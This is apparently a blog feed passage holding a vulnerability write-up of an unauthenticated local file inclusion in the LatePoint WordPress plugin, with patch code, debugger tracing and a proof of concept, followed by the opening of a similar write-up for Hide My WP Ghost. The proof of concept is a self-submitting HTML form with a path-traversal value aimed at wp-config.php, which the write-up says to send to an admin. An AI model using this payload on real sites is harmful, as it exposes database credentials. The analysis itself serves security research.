$this-&amp;gt;add_extension($layout, &amp;#39;.php&amp;#39;);&#xA;    $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file;&#xA;&#xA;    // 5. Use realpath to resolve any remaining traversal attempts&#xA;    $real_path = realpath($full_path);&#xA;    $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH);&#xA;&#xA;    // 6. Ensure the resolved path is within the layouts directory&#xA;    if ($real_path &amp;amp;&amp;amp; $base_path &amp;amp;&amp;amp; strpos($real_path, $base_path) === 0) {&#xA;        return $real_path;&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch adds &lt;code&gt;get_safe_layout_path()&lt;/code&gt; to remove &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, &lt;code&gt;.&lt;/code&gt;, and null bytes; only allow &lt;code&gt;[A-Za-z0-9_-]&lt;/code&gt;; construct the path, use &lt;code&gt;realpath()&lt;/code&gt; and compare it with &lt;code&gt;LATEPOINT_VIEWS_LAYOUTS_ABSPATH&lt;/code&gt;. The file is included only if valid, preventing LFI.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;render()&lt;/code&gt; function is called in &lt;strong&gt;12 different locations&lt;/strong&gt;, so &lt;strong&gt;manual tracing&lt;/strong&gt; would be time-consuming.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/ref.png&#34;&#xA;    alt=&#34;12 call locations of render()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;12 call locations of &lt;code&gt;render()&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;To optimize, use a &lt;strong&gt;debugger&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Set a &lt;strong&gt;breakpoint&lt;/strong&gt; inside &lt;code&gt;render()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Perform various actions through the UI.&lt;/li&gt;&#xA;&lt;li&gt;Each time &lt;code&gt;render()&lt;/code&gt; is called, execution &lt;strong&gt;pauses at the breakpoint&lt;/strong&gt; and &lt;strong&gt;highlights&lt;/strong&gt; the corresponding code line, allowing quick identification of call flows.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/scr.gif&#34;&#xA;    alt=&#34;Debugger jumps to breakpoint&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger jumps to breakpoint&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 When accessing the endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&lt;/code&gt; with route names as plugin submenus, &lt;code&gt;render()&lt;/code&gt; is invoked with the default layout &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/default_layout.png&#34;&#xA;    alt=&#34;Default layout&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Default layout&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Examining the callstack reveals the call flow leading to &lt;code&gt;render()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/callstack.png&#34;&#xA;    alt=&#34;Callstack flow&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Callstack flow&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){&#xA;  $html = &amp;#39;&amp;#39;;&#xA;  if($this-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;    if(is_array($view_name)) $view_name = $view_name[&amp;#39;json_view_name&amp;#39;];&#xA;    $response_html = $this-&amp;gt;render($this-&amp;gt;get_view_uri($view_name, $from_shared_folder), &amp;#39;none&amp;#39;, $extra_vars);&#xA;    $this-&amp;gt;send_json(array_merge(array(&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_SUCCESS, &amp;#39;message&amp;#39; =&amp;gt; $response_html), $json_return_vars));&#xA;  }else{&#xA;    if(is_array($view_name)) $view_name = $view_name[&amp;#39;html_view_name&amp;#39;];&#xA;    $this-&amp;gt;extra_css_classes[] = $this-&amp;gt;generate_css_class($view_name);&#xA;    $this-&amp;gt;vars[&amp;#39;extra_css_classes&amp;#39;] = $this-&amp;gt;extra_css_classes;&#xA;    $html = $this-&amp;gt;render($this-&amp;gt;get_view_uri($view_name, $from_shared_folder), $this-&amp;gt;get_layout(), $extra_vars);&#xA;  }&#xA;  return $html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render()&lt;/code&gt; is called by &lt;code&gt;format_render_return()&lt;/code&gt; when &lt;code&gt;get_return_format()&lt;/code&gt; is not &lt;code&gt;json&lt;/code&gt;; by default, it’s &lt;code&gt;html&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$return_format = &amp;#39;html&amp;#39;&#xA;...&#xA;function get_return_format(){&#xA;  return $this-&amp;gt;return_format;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;layout&lt;/code&gt; we’re interested in comes from &lt;code&gt;get_layout()&lt;/code&gt;. Since &lt;code&gt;get_layout()&lt;/code&gt; exists, there should be a corresponding &lt;code&gt;set_layout()&lt;/code&gt;. Searching for &lt;code&gt;set_layout&lt;/code&gt; in the same file shows how the layout value is set.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$layout = &amp;#39;admin&amp;#39;&#xA;...&#xA;function set_layout($layout = &amp;#39;admin&amp;#39;){&#xA;  if(isset($this-&amp;gt;params[&amp;#39;layout&amp;#39;])){&#xA;    $this-&amp;gt;layout = $this-&amp;gt;params[&amp;#39;layout&amp;#39;];&#xA;  }else{&#xA;    $this-&amp;gt;layout = $layout;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;$layout&lt;/code&gt; variable is assigned the default value &lt;strong&gt;&lt;code&gt;&#39;admin&#39;&lt;/code&gt;&lt;/strong&gt;, matching the layout analyzed earlier.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;set_layout()&lt;/code&gt; function determines which layout to use:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If &lt;code&gt;$this-&amp;gt;params&lt;/code&gt; contains a &lt;code&gt;layout&lt;/code&gt; parameter, it uses that value.&lt;/li&gt;&#xA;&lt;li&gt;Otherwise, it falls back to the default (&lt;code&gt;&#39;admin&#39;&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;We can use the &lt;strong&gt;debugger&lt;/strong&gt; again to inspect &lt;code&gt;$params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/params.png&#34;&#xA;    alt=&#34;Value of $params&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Value of &lt;code&gt;$params&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; includes two keys, &lt;code&gt;page&lt;/code&gt; and &lt;code&gt;route_name&lt;/code&gt;, matching the query parameters when accessing &lt;code&gt;http://localhost/wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Therefore, &lt;code&gt;layout&lt;/code&gt; can also be passed as a URL parameter — which we can exploit.&lt;/p&gt;&#xA;&lt;p&gt;Try accessing the endpoint with a &lt;code&gt;layout&lt;/code&gt; parameter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&amp;amp;layout=payload HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/admin.php?page=latepoint&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$layout&lt;/code&gt; is now fully under our control.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/layout.png&#34;&#xA;    alt=&#34;Controlled $layout&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Controlled &lt;code&gt;$layout&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create a webpage containing a form that automatically submits an LFI payload.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost:80/wp-admin/admin.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;latepoint&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;route_name&amp;#34; value=&amp;#34;calendars__view&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;layout&amp;#34; value=&amp;#34;../../../../../../wp-config&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Send the malicious webpage link to an admin or privileged user.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;The debugger stopped at &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/result.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Since this CVE is &lt;strong&gt;Unauthenticated&lt;/strong&gt;, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Versions &lt;strong&gt;≤ 5.1.93&lt;/strong&gt; of LatePoint are vulnerable to &lt;strong&gt;LFI&lt;/strong&gt; because the &lt;code&gt;layout&lt;/code&gt; parameter is not validated before being passed to &lt;code&gt;include()&lt;/code&gt;, leading to potential &lt;strong&gt;local file disclosure&lt;/strong&gt; (e.g., &lt;code&gt;wp-config.php&lt;/code&gt;). The issue was patched in &lt;strong&gt;5.1.94&lt;/strong&gt; by sanitizing characters, using &lt;code&gt;realpath()&lt;/code&gt;, and restricting to valid directories.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;This is &lt;strong&gt;LFI (file read)&lt;/strong&gt; — no RCE observed in PoC.&lt;/li&gt;&#xA;&lt;li&gt;Path-controlled parameters must be &lt;strong&gt;sanitized + canonicalized&lt;/strong&gt; before use.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;strong&gt;realpath()&lt;/strong&gt; and &lt;strong&gt;base directory validation&lt;/strong&gt; to prevent traversal.&lt;/li&gt;&#xA;&lt;li&gt;Never &lt;strong&gt;include&lt;/strong&gt; directly from request data; use safe helpers like &lt;code&gt;get_safe_layout_path()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-94-unauthenticated-lfi-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress LatePoint Plugin &amp;lt;= 5.1.93 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26909 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-18-cve-2025-26909/</link>
      <pubDate>Sat, 18 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-18-cve-2025-26909/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Hide My WP Ghost&lt;/strong&gt; plugin version &lt;strong&gt;≤ 5.4.01&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter used in &lt;code&gt;include/require&lt;/code&gt;, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, possible code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26909&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26909&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.4.01&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.4.02&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.6)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hide-my-wp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hide My WP Ghost 